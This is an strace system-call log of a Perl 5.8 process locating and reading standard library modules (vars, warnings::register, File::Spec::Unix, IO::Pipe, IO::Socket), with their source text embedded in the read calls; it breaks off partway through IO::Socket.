10890 07:35:08.665416 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665429 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665443 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665455 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665479 stat64("/usr/lib/perl5/vars.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665492 stat64("/usr/lib/perl5/vars.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665505 stat64("/usr/share/perl5/vars.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665516 stat64("/usr/share/perl5/vars.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665530 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665542 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665555 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665568 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
10890 07:35:08.665589 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
10890 07:35:08.665602 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbbfcd8) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.665614 _llseek(10, 0, [0], SEEK_CUR) = 0
10890 07:35:08.665630 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
10890 07:35:08.665748 stat64("/etc/perl/warnings/register.pmc", 0xbfbbfb0c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665763 stat64("/etc/perl/warnings/register.pm", 0xbfbbfa1c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665776 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfbbfb0c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665790 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfbbfa1c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665804 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfbbfb0c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665818 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfbbfa1c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665832 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfbbfb0c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665845 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfbbfa1c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665859 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfbbfb0c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665871 stat64("/usr/share/perl5/warnings/register.pm", 0xbfbbfa1c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665885 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfbbfb0c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665898 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfbbfa1c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665912 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfbbfb0c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665925 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
10890 07:35:08.665947 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
10890 07:35:08.665962 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbbf828) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.665995 _llseek(11, 0, [0], SEEK_CUR) = 0
10890 07:35:08.666018 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
10890 07:35:08.666167 read(11, "", 4096) = 0
10890 07:35:08.666180 close(11)         = 0
10890 07:35:08.666379 _llseek(10, 1148, [1148], SEEK_SET) = 0
10890 07:35:08.666395 _llseek(10, 0, [1148], SEEK_CUR) = 0
10890 07:35:08.666406 close(10)         = 0
10890 07:35:08.666517 _llseek(8, 594, [594], SEEK_SET) = 0
10890 07:35:08.666548 _llseek(8, 0, [594], SEEK_CUR) = 0
10890 07:35:08.666559 close(8)          = 0
10890 07:35:08.666594 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666610 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666629 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666643 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666671 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666685 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666699 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666712 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666726 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666738 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666752 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666765 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666779 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.666792 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
10890 07:35:08.666814 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.666830 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.666841 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.666859 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
10890 07:35:08.667550 brk(0x8218000)    = 0x8218000
10890 07:35:08.667684 read(8,  <unfinished ...>
10888 07:35:08.674021 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
10890 07:35:08.674052 <... read resumed> "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
10890 07:35:08.674451 read(8,  <unfinished ...>
10888 07:35:08.674461 <... rt_sigprocmask resumed> NULL, 8) = 0
10888 07:35:08.674490 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10888 07:35:08.674507 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10888 07:35:08.674518 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10888 07:35:08.674531 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
10888 07:35:08.674545 waitpid(-1,  <unfinished ...>
10890 07:35:08.674555 <... read resumed> "", 4096) = 0
10890 07:35:08.674563 close(8)          = 0
10890 07:35:08.674764 read(5, "", 4096) = 0
10890 07:35:08.684034 close(5)          = 0
10890 07:35:08.684235 stat64("/etc/perl/IO/Pipe.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684252 stat64("/etc/perl/IO/Pipe.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684266 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684279 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684293 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684306 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684319 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684331 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684344 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684356 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684368 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.684381 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
10890 07:35:08.684402 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 5
10890 07:35:08.684417 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0638) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.684428 _llseek(5, 0, [0], SEEK_CUR) = 0
10890 07:35:08.684449 read(5, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
10890 07:35:08.685263 _llseek(5, 3425, [3425], SEEK_SET) = 0
10890 07:35:08.685282 _llseek(5, 0, [3425], SEEK_CUR) = 0
10890 07:35:08.685292 close(5)          = 0
10890 07:35:08.685316 stat64("/etc/perl/IO/Socket.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685330 stat64("/etc/perl/IO/Socket.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685343 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685356 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685370 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685382 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685396 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685412 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685425 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685437 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685450 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.685494 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
10890 07:35:08.685533 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 5
10890 07:35:08.685561 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0638) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.685573 _llseek(5, 0, [0], SEEK_CUR) = 0
10890 07:35:08.685590 read(5, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return 